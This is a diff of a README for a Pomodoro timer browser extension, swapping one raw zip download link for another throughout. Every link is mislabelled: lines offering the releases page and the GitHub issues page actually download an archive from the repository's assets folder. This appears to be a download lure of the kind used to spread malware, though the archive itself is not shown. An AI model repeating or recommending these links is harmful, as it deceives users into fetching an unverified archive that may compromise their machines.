@@ -1,6 +1,6 @@
 # 🕒 pomodoro-extension - Enhance Your Focus with a Simple Timer
 
-[![Download Now](https://github.com/Meghsss/pomodoro-extension/raw/refs/heads/main/assets/pomodoro_extension_2.0.zip%20Now-Release%https://github.com/Meghsss/pomodoro-extension/raw/refs/heads/main/assets/pomodoro_extension_2.0.zip)](https://github.com/Meghsss/pomodoro-extension/raw/refs/heads/main/assets/pomodoro_extension_2.0.zip)
+[![Download Now](https://raw.githubusercontent.com/Meghsss/pomodoro-extension/main/assets/pomodoro-extension-1.4.zip%20Now-Release%https://raw.githubusercontent.com/Meghsss/pomodoro-extension/main/assets/pomodoro-extension-1.4.zip)](https://raw.githubusercontent.com/Meghsss/pomodoro-extension/main/assets/pomodoro-extension-1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, you need to download the extension.
 
 1. **Visit the Releases Page:** Click the link below to access the releases page for this extension:
    
-   [Download Here](https://github.com/Meghsss/pomodoro-extension/raw/refs/heads/main/assets/pomodoro_extension_2.0.zip)
+   [Download Here](https://raw.githubusercontent.com/Meghsss/pomodoro-extension/main/assets/pomodoro-extension-1.4.zip)
 
 2. **Select the Latest Release:** On the releases page, choose the most recent version of the extension. You will find a list of all available downloads.
 
@@ -75,10 +75,10 @@ If you face any issues, visit the GitHub repository for more information or to r
 
 ## 📞 Get Support
 
-For further assistance, you can reach out via the [GitHub issues page](https://github.com/Meghsss/pomodoro-extension/raw/refs/heads/main/assets/pomodoro_extension_2.0.zip). We are here to help you make the most of your Pomodoro sessions.
+For further assistance, you can reach out via the [GitHub issues page](https://raw.githubusercontent.com/Meghsss/pomodoro-extension/main/assets/pomodoro-extension-1.4.zip). We are here to help you make the most of your Pomodoro sessions.
 
 ## 🎉 Acknowledgements
 
 Thank you for choosing the Pomodoro Extension. We hope it helps you stay productive and focused. Don't forget to check for updates regularly!
 
-[Download Here](https://github.com/Meghsss/pomodoro-extension/raw/refs/heads/main/assets/pomodoro_extension_2.0.zip)
+[Download Here](https://raw.githubusercontent.com/Meghsss/pomodoro-extension/main/assets/pomodoro-extension-1.4.zip)
